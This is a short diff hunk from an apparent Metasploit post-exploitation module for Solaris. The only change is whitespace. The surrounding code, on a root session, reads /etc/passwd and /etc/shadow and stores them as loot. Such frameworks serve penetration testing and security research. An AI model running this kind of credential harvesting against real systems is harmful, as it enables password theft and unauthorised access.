@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Post
 		if is_root?
 			passwd_file = read_file("/etc/passwd")
 			shadow_file = read_file("/etc/shadow")
-			
+
 			# Save in loot the passwd and shadow file
 			store_loot("solaris.shadow", "text/plain", session, shadow_file, "shadow.tx", "Solaris Password Shadow File")
 			store_loot("solaris.passwd", "text/plain", session, passwd_file, "passwd.tx", "Solaris Passwd File")
